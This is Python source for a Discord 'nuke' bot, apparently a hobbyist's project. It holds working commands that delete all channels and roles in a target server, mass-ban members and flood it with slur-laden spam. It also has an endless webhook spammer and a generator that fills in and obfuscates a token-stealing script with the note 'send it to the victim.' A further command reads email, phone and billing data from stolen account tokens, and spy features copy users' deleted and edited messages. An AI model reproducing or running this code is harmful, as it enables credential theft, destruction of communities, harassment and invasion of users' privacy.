import discord
import asyncio
import requests
import time
import random
import io
import base64
import marshal
import string
from config import TOKEN
from tokeninfo import tokeninfo
from discord.ext import commands




# ================ multifunction discord bot (or just nuke) ================ # 
# ++++++++++++++++          started at 10/17/2023           ++++++++++++++++ #


                # ================ changelog ================ # 
                # added tokeninformation
                # flush will now delete channels before spamming
                # added tokeninfo.py
                # ================ changelog ================ # 




                # ================ to do list ================ # 
                # add multiple channel names and message content for customflush
                # fix mass ban
                # fix profile spy
                # add await ctx.message.add_reaction("✔️") to every command
                # perhaps add some user token functions
                # ================ to do list ================ # 





YOURUSERID = '992952207588720730'
PREFIX = '!'

intents = discord.Intents.all()


bot = commands.Bot(command_prefix=PREFIX, intents=intents)


bot.remove_command('help')

def check_token_type(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        if 'bot' in data:
            return 'Bot'
        else:
            return 'Account'
    else:
        return 'Invalid/Bot'



@bot.event
async def on_ready():
    user = await bot.fetch_user(YOURUSERID)
    await bot.change_presence(status=discord.Status.dnd)
    await user.send("Bot ready. Developed by <@992952207588720730>")
    game = discord.Game(f"{PREFIX}help")
    await bot.change_presence(activity=game)
    print(f'Logged in as {bot.user.name}')



@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.reply(f"Invalid command.\n`{PREFIX}help`")


# goofy spy #
# ========================================================================= #
auditlogspy = "OFF"
userprofilespy = "OFF"
banspy = "OFF"
deletespy = "OFF"
leavespy = "OFF"
editspy = "OFF"


@bot.event
async def on_audit_log_entry_create(entry):
    global auditlogspy

    if auditlogspy != "OFF":
        guild = entry.guild
        channel = discord.utils.get(guild.text_channels, name='spy')

        embed = discord.Embed(title='Audit Log Entry Created', color=discord.Color.green())
        embed.add_field(name='Action', value=str(entry.action), inline=False)
        embed.add_field(name='User', value=str(entry.user), inline=False)
        embed.add_field(name='Target', value=str(entry.target), inline=False)
        embed.add_field(name='Reason', value=str(entry.reason), inline=False)
        embed.add_field(name='Guild', value=f'{entry.guild}', inline=False)

        await channel.send(embed=embed)






@bot.event
async def on_member_update(before, after):
    global userprofilespy

    if userprofilespy != "OFF":
        guild = after.guild
        channel = discord.utils.get(guild.text_channels, name='spy')

        userbefore = before.name
        userafter = after.name

        

        avbefore = before.avatar.url if before.avatar else None
        avafter = after.avatar.url if after.avatar else None

        beforedis = before.display_name
        afterdis = after.display_name

        embed = discord.Embed(title="Spy", description="Profile change detected.", color=discord.Color.dark_green())
        embed.add_field(name="Username before:", value=f"{userbefore}", inline=False)
        embed.add_field(name="Username after:", value=f"{userafter}", inline=False)
        embed.add_field(name="Display name before:", value=f"{beforedis}", inline=False)
        embed.add_field(name="Display name after:", value=f"{afterdis}", inline=False)

        
        embedtwo = discord.Embed(title="Avatar before:", description="", color=discord.Color.dark_green())
        embedtwo.set_image(url=avbefore)

        embedthree = discord.Embed(title="Avatar after:", description="", color=discord.Color.dark_green())
        embedthree.set_image(url=avafter)

        await channel.send(embed=embed)
        await channel.send(embed=embedtwo)
        await channel.send(embed=embedthree)
        
@bot.event
async def on_member_ban(guild, user):
    channel = discord.utils.get(guild.text_channels, name='spy')
    global banspy

    if banspy != "OFF":
        avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
        embed = discord.Embed(title="User banned", description=f"**{user}** was banned in {guild}.", color=discord.Color.red())
        embed.set_image(url=f"{avatar_url}")
        await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    guild = member.guild
    channel = discord.utils.get(guild.text_channels, name='spy')
    global leavespy

    if leavespy != "OFF":
        embed = discord.Embed(title="User left", description=f"**{member}** left {guild}.", color=discord.Color.dark_gray())
        await channel.send(embed=embed)
    
@bot.event
async def on_message_delete(message):
    guild = message.guild
    content = message.content
    author = message.author
    channelx = message.channel
    channel = discord.utils.get(guild.text_channels, name='spy')
    global deletespy

    if deletespy != "OFF":
        embed = discord.Embed(title="Message deleted", description="", color=discord.Color.dark_teal())
        embed.add_field(name="Message content:", value=f"**{content}**", inline=False)
        embed.add_field(name="Message author:", value=f"{author}", inline=False)
        embed.add_field(name="Channel where message was deleted: ", value=f"#{channelx}", inline=False)
        embed.add_field(name="Server where message was deleted: ", value=f"{guild}", inline=False)

        await channel.send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    befx = before.content
    aftx = after.content
    guild = after.guild
    author = after.author
    channelz = after.channel
    channel = discord.utils.get(guild.text_channels, name='spy')
    global editspy
    
    if editspy != "OFF":
        embed = discord.Embed(title="Message edited", description="", color=discord.Color.light_gray())
        embed.add_field(name="Before: ", value=f"{befx}", inline=False)
        embed.add_field(name="After: ", value=f"{aftx}", inline=False)
        embed.add_field(name="Channel: ", value=f"#{channelz}", inline=False)
        embed.add_field(name="Server: ", value=f"{guild}", inline=False)
        embed.add_field(name="Message author: ", value=f"{author}", inline=False)

        await channel.send(embed=embed)

    
@bot.command()
async def auditspytoggle(ctx, mode: str):
    global auditlogspy
    if mode.lower() == "on":
        auditlogspy = "ON"
        await ctx.reply("Audit log spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        auditlogspy = "OFF"
        await ctx.reply("Audit log spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")




@bot.command()
async def profilespytoggle(ctx, mode: str):
    global userprofilespy
    if mode.lower() == "on":
        userprofilespy = "ON"
        await ctx.reply("Profile spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        userprofilespy = "OFF"
        await ctx.reply("Profile spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def banspytoggle(ctx, mode: str):
    global banspy
    if mode.lower() == "on":
        banspy = "ON"
        await ctx.reply("Ban spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        banspy = "OFF"
        await ctx.reply("Ban spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def leavespytoggle(ctx, mode: str):
    global leavespy
    if mode.lower() == "on":
        leavespy = "ON"
        await ctx.reply("Member leave spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        leavespy = "OFF"
        await ctx.reply("Member leave spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")


@bot.command()
async def deletespytoggle(ctx, mode: str):
    global deletespy
    if mode.lower() == "on":
        deletespy = "ON"
        await ctx.reply("Message deletion spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        deletespy = "OFF"
        await ctx.reply("Message deletion spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def editspytoggle(ctx, mode: str):
    global editspy
    if mode.lower() == "on":
        editspy = "ON"
        await ctx.reply("Edit spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        editspy = "OFF"
        await ctx.reply("Edit spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")


# goofy spy #
# ========================================================================= #




@bot.command()
async def setstatus(ctx, status: str):
    if ctx.author.id != int(YOURUSERID):
        await ctx.reply('You are not authorized to use this command.')
        return

    if status.lower() == 'online':
        await bot.change_presence(status=discord.Status.online)
        await ctx.reply('Done.')
    elif status.lower() == 'idle':
        await bot.change_presence(status=discord.Status.idle)
        await ctx.reply('Done.')
    elif status.lower() == 'dnd' or status.lower() == 'do not disturb':
        await bot.change_presence(status=discord.Status.dnd)
        await ctx.reply('Done.')
    elif status.lower() == 'invisible':
        await bot.change_presence(status=discord.Status.invisible)
        await ctx.reply('Done.')
    else:
        await ctx.reply('Invalid status. Please choose one of the following: online, idle, dnd, invisible')


@bot.command()
async def flush(ctx, server_id):
    try:
        channel_names = ["NUKED NIGGAS", "get fucked", "RAIDED", "GET SHITTED ON"]
        message_contents = ["@everyone GET NUKED 🤡", "@everyone RAIDED", "@everyone speak your shit lil niggas", "@everyone FLOP"]
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            
            for channel in guild.channels:
                await channel.delete()

            created_channels = []
            channel_amount = 10
            message_amount = 80

            for _ in range(channel_amount):
                new_channel_name = random.choice(channel_names)
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                message_content = random.choice(message_contents)
                task = asyncio.create_task(send_messages(channel, message_amount, message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)
    except Exception as e:
        await ctx.reply(f"Error: {e}")





@bot.command()
async def customflush(ctx, server_id, channel_amount, channel_name, message_amount, *, message_content):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            created_channels = []
            for _ in range(int(channel_amount)):
                new_channel_name = channel_name.strip()
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                task = asyncio.create_task(send_messages(channel, int(message_amount), message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)

            await ctx.send("Operation complete.")
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.send("Invalid syntax.")
        
@bot.command()
async def purge(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            for channel in guild.channels:
                await channel.delete()
            
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.reply("Invalid input. Please try again.")


@bot.command()
async def help(ctx):
    help_embed = discord.Embed(title='Bithub [ALPHA] V0.01', color=discord.Color.blue())
    help_embed.add_field(name='', value='Nuke ☢️', inline=False)
    help_embed.add_field(name='', value='Utility 🛠️', inline=False)
    help_embed.add_field(name='', value='Spy 👁️', inline=False)
    help_embed.add_field(name='', value='Side functions 😈', inline=False)
    help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
    view = XOLOVIEW()
    await ctx.reply(embed=help_embed, view=view)

@bot.command()
async def leave(ctx, server_id):
    guild = bot.get_guild(int(server_id))
    if guild is not None:
        guildname = guild.name
        await guild.leave()
        await ctx.send(f"Successfully left the server **{guildname}**.")
    else:
        await ctx.send(f"Could not find the server with ID {server_id}.")

@bot.command()
async def link(ctx):
    
    await ctx.message.add_reaction("✔️")

    await ctx.reply("https://discord.com/api/oauth2/authorize?client_id=999232775443984495&permissions=8&scope=bot")


@bot.command()
async def servlist(ctx):
    servers = bot.guilds
    server_list = ""
    for server in servers:
        text_channels = server.text_channels
        if text_channels:
            invite = await text_channels[0].create_invite()
            permissions = server.me.guild_permissions
            if permissions.administrator:
                permission_string = "Yes"
            else:
                permission_string = "No"
            server_info = f"**{server.name}** (ID: {server.id})\nInvite: {invite.url}\nHas Admin: {permission_string}\n================================\n"
            server_list += server_info
    await ctx.send(f"Server list:\n{server_list}")

@bot.command()
async def massping(ctx, server_id: int, message_amount: int = 5, *, message_content: str = ""):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    members = guild.members[:50]  # Fetch up to 50 members
    mentions = ' '.join(member.mention for member in members)

    tasks = []
    for channel in guild.text_channels:
        for _ in range(message_amount):
            tasks.append(channel.send(f"{mentions} {message_content}"))

    await asyncio.gather(*tasks)

    await ctx.message.add_reaction("✔️")
    

@bot.command()
async def clear(ctx, server_id: int):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    def is_bot_message(message):
        return message.author == bot.user

    deleted_count = 0
    for channel in guild.text_channels:
        async for message in channel.history(limit=None):
            if is_bot_message(message):
                await message.delete()
                deleted_count += 1

    await ctx.message.add_reaction("✔️")
    await ctx.send(f"Deleted {deleted_count} message(s) sent by the bot.")


@bot.command()
async def clearchannel(ctx, server_id: int, channel_id: int):
    try:
        guild = bot.get_guild(server_id)
        channel = guild.get_channel(channel_id)

        if not channel:
            await ctx.send(f"Channel with ID {channel_id} not found.")
            return

        await channel.purge()
        await ctx.send(f"All messages in channel **{channel.name}** have been deleted.")
    except:
        pass


@bot.command()
async def rolepurge(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await ctx.send("Invalid server ID or bot is not a member of the server.")
            return

        roles = guild.roles
        bot_role = guild.get_member(bot.user.id).top_role

        for role in roles:
            if role.name != "@everyone" and role != bot_role:
                await role.delete()
        
        await ctx.send("All deletable roles have been deleted.")
    except discord.errors.Forbidden:
        pass
        await ctx.send("All deletable roles have been deleted.")
    except ValueError:
        await ctx.send("Invalid server ID format.")




    
    
@bot.command()
async def say(ctx, *args):
    message = " ".join(args)
    await ctx.message.delete() 
    await ctx.send(message)

@bot.command()
async def ban(ctx, user_id: int, *, reason="No reason provided."):
    try:
        user = await bot.fetch_user(user_id)
        await user.send(f'You have been banned from {ctx.guild.name}.\nReason: **{reason}**')
        await ctx.guild.ban(user, reason=reason)
        await ctx.reply(f'Successfully banned user with ID: {user_id}.\nReason: **{reason}**')
    
    except discord.NotFound:
        await ctx.reply('User not found/Failed.')

@bot.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    try:
        await ctx.guild.unban(user)
        await ctx.reply(f'Unbanned **{user.name}**')
    except:
        await ctx.reply('Failed.')


@bot.command()
async def massban(ctx):
    guild = ctx.guild
    members = guild.members

    try:
        for member in members:
            await guild.ban(member)
            await asyncio.sleep(0.8)
            
    except:
        pass  

    await ctx.send('Successfully banned all users.')

@bot.command()
async def dm(ctx, userid, *, messagecontent):
    user = await bot.fetch_user(userid)
    try:
        await user.send(f"{messagecontent}\n_Sent by {ctx.author.display_name}_")
        await ctx.send("Direct message sent successfully!")
    except discord.Forbidden:
        await ctx.send("Unable to send a direct message to the user.")


@bot.command()
async def webhookspam(ctx, webhook, msg):
    await ctx.reply("Spamming webhook....")
    await ctx.message.add_reaction("✔️")
    webhookfuck(webhook, msg)


@bot.command()
async def avatar(ctx, user: discord.User):
    avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
    embed = discord.Embed(title=f"Dis nigga {user.name}'s avatar", description="", color=discord.Color.gold())
    embed.set_footer(text="amazing pfp")
    embed.set_image(url=f"{avatar_url}")
    await ctx.reply(embed=embed)

@bot.command()
async def tokengrabber(ctx, webhook, obfus):
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        await ctx.reply("Invalid webhook URL.")
        return

    with open('grabber.py', 'r') as file:
        content = file.read()

    
    new_content = content.replace('thewebhook', webhook)

    if obfus.lower() == "true":
        new_content = obfuscate(new_content)
    else:
        new_content = new_content


    file_object = io.StringIO(new_content)
    file = discord.File(file_object, filename='tokengrabber.py')

    
    await ctx.reply(file=file, content='Rename this and send it to the victim. The victim must have python installed.')


@bot.command()
async def tokeninformation(ctx, token):
    
    info = tokeninfo(token)
                                                      # 4
    
    try:
        embed = discord.Embed(title="Token Information", color=discord.Color.gold())
        embed.add_field(name="Username", value=info[1], inline=False)
        embed.add_field(name="User ID", value=info[2], inline=False)
        embed.add_field(name="Phone Number", value=info[4], inline=False)
        embed.add_field(name="Email", value=info[5], inline=False)
        embed.add_field(name="Locale", value=info[12], inline=False)
        embed.add_field(name="Language", value=info[6], inline=False)
        embed.add_field(name="Creation Date [Day-Month-Year]", value=info[7], inline=False)
        embed.add_field(name="Has nitro", value=info[8], inline=False)
        embed.add_field(name="MFA enabled", value=info[9], inline=False)
        embed.add_field(name="Flags", value=info[10], inline=False)
        embed.add_field(name="Verified", value=info[11], inline=False)
        embed.set_footer(text="Billing info will also be sent if any.")
        embed.set_image(url=info[3])


        await ctx.reply(embed=embed)
        
        billinginfo = None

        if info is not None and len(info) >= 14:
            bill = info[13]
            if bill is not None:
                data = bill[0]
                billinginfo = discord.Embed(title="Billing Information", color=discord.Color.gold())
                for field_name, field_value in data.items():
                    billinginfo.add_field(name=field_name, value=field_value, inline=False)
                await ctx.reply(embed=billinginfo)
            else:
                await ctx.reply("No billing information available.")
        else:
            pass
        
        

    except Exception as e:
        await ctx.send(info)
    
#                                  non bot functions                                      #

#=========================================================================================#


def obfuscate(content):
    compiled_code = compile(content, '<string>', 'exec')
        # Marshal the compiled code
    marshalled_code = marshal.dumps(compiled_code)
        # Base64 encode the marshalled code
    encoded_code = base64.b64encode(marshalled_code).decode('latin1')

    rvn = ''.join(random.choice(string.ascii_letters) for _ in range(5))

    obfuscated_code = f'''
import base64
import marshal

{rvn} = {encoded_code!r}
exec(marshal.loads(base64.b64decode({rvn}.encode('latin1'))))
'''
    
    return obfuscated_code

async def send_messages(channel, num_messages, message_content):
    for _ in range(num_messages):
        await channel.send(message_content)




def webhookfuck(WebHook, Message):
    while True:
        response = requests.post(
            WebHook,
            json = {"content" : Message},
            params = {'wait' : True}
        )
        try:
            
            if response.status_code == 204 or response.status_code == 200:
                print("Sent")
            elif response.status_code == 429:
                print("rate limited")
                
                time.sleep(response.json()["retry_after"] / 1000)
            else:
                print("error")

            time.sleep(.01)
        except KeyboardInterrupt:
            break





class XOLOVIEW(discord.ui.View):
    @discord.ui.button(label="☢️",
                       style=discord.ButtonStyle.danger)
    async def nig(self, interaction: discord.Interaction, button: discord.ui.Button):
        help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
        help_embed.add_field(name='Flush', value='Nukes server\n`!flush <serverid>`', inline=False)
        help_embed.add_field(name='Custom Flush', value='Creates channels and messages\n`!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `!customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
        help_embed.add_field(name='Purge', value='Deletes all channels\n`!purge <serverid>`', inline=False)
        help_embed.add_field(name='Mass Ping [Use if the bot does not have admin]', value='`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
        help_embed.add_field(name='Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
        help_embed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
        help_embed.add_field(name='Role Purge (Cannot delete roles above the bot)', value='`!rolepurge <serverid>`', inline=False)
        help_embed.add_field(name='❌ Mass Ban [PROBABLY BROKEN]', value='`!massban <serverid>`', inline=False)
        help_embed.set_footer(text="Made by xolo")

        await interaction.response.send_message(embed=help_embed, ephemeral=True)

    @discord.ui.button(label="🛠️",
                       style=discord.ButtonStyle.green)
    async def niga(self, interaction: discord.Interaction, button: discord.ui.Button):
        helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
        helpembed.add_field(name='Leave', value='Leaves the server\n`!leave <serverid>`', inline=False)
        helpembed.add_field(name='Link', value='Invite link\n`!link`', inline=False)
        helpembed.add_field(name='Server List', value='`!servlist`', inline=False)
        helpembed.add_field(name='Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
        helpembed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
        helpembed.add_field(name='Token Information', value='`!tokeninformation <token>`', inline=False)
        helpembed.add_field(name='Say', value='`!say <msg>`', inline=False)
        helpembed.add_field(name='Ban', value='`!ban <userid> <reason>`', inline=False)
        helpembed.add_field(name='UnBan', value='`!unban <userid>`', inline=False)
        helpembed.add_field(name='DM', value='`!dm <userid> <msgcontent>`', inline=False)
        helpembed.add_field(name='Avatar', value='`!avatar <user>`', inline=False)
        helpembed.set_footer(text="Made by xolo. | Started at 10/17/2023.")

        await interaction.response.send_message(embed=helpembed, ephemeral=True)

    @discord.ui.button(label="👁️",
                       style=discord.ButtonStyle.gray)
    async def nigaz(self, interaction: discord.Interaction, button: discord.ui.Button):
        global auditlogspy
        global banspy
        global userprofilespy
        global leavespy
        global deletespy
        global editspy
        helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
        helpxembed.add_field(name='Audit log spy [!auditspytoggle]', value=f'Status: {auditlogspy}', inline=False)
        helpxembed.add_field(name='❌ User profile change spy [BROKEN] [!profilespytoggle] ❌', value=f'Status: {userprofilespy}', inline=False)
        helpxembed.add_field(name='Ban detector [!banspytoggle]', value=f'Status: {banspy} ', inline=False)
        helpxembed.add_field(name='Leave detector [!leavespytoggle]', value=f'Status: {leavespy} ', inline=False)
        helpxembed.add_field(name='Message deletion spy [!deletespytoggle]', value=f'Status: {deletespy} ', inline=False)
        helpxembed.add_field(name='Message edit spy [!editspytoggle]', value=f'Status: {editspy} ', inline=False)
        helpxembed.set_footer(text="Made by xolo. | Started at 10/17/2023.")


        await interaction.response.send_message(embed=helpxembed, ephemeral=True)


    @discord.ui.button(label="😈",
                       style=discord.ButtonStyle.blurple)
    async def nigar(self, interaction: discord.Interaction, button: discord.ui.Button):
        help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
        help_embed.add_field(name='Webhook Spammer', value='`!webhookspam <webhook> <msgcontent>`', inline=False)
        help_embed.add_field(name='Token grabber generator', value='`!tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
        help_embed.set_footer(text="Made by xolo")

        await interaction.response.send_message(embed=help_embed, ephemeral=True)


        

bot.run(TOKEN)
